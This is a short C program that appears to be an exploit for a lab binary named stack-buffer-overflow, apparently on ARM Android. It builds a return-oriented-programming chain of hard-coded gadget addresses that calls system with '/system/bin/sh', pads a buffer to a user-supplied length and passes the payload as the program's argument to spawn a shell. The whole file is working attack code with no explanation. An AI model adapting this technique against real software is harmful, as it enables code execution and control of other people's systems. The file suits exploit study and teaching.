#include <unistd.h>
#include <stdlib.h>

#define OFFSET 0x40002000

unsigned long rop[] = { 
  OFFSET + 0x000189db,  	// pop	{r4, pc}
  OFFSET + 0x0003ad3a,  	// "/system/bin/sh"
  OFFSET + 0x000189d9,  	// mov	r0, r4
 				// pop  {r4, pc}
  0xcccccccc,
  OFFSET + 0x0001a3a5,		// system(const char *)
  0
};
  
void main(int argc, char *argv[]) {
  unsigned long size = strtoul(argv[1], NULL, 10);
  char *payload = malloc(size + sizeof(rop));
  memset(payload, 'C', size);
  memcpy(payload + size, rop, sizeof(rop));
  execl("./stack-buffer-overflow", "./stack-buffer-overflow", payload, NULL);
}

